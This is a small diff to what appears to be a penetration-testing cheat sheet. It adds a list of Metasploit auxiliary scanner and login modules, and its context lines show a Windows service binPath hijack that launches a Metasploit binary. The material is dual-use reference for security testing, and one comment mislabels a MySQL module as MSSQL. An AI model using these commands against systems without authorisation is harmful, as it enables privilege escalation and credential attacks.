@@ -162,6 +162,15 @@ sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" sta
 net start <vulnerable-service>
 ```
 
+Metasploit Auxiliry Modules:
+```
+$ use auxiliary/scanner/http/dir_scanner		# HTTP directory scanner
+$ use auxiliary/scanner/http/jboss_vulnscan	# JBOSS vulnerability scanner
+$ use auxiliary/scanner/mssql/mssql_login	# MSSQL Login Module
+$ use auxiliary/scanner/mysql/mysql_version	# MSSQL Version Scanner
+$ use auxiliary/scanner/oracle/oracle_login	# Oracle Login Module
+```
+
 ### EXPLOITS - USING / COMPILING
 
 Compilation tips:
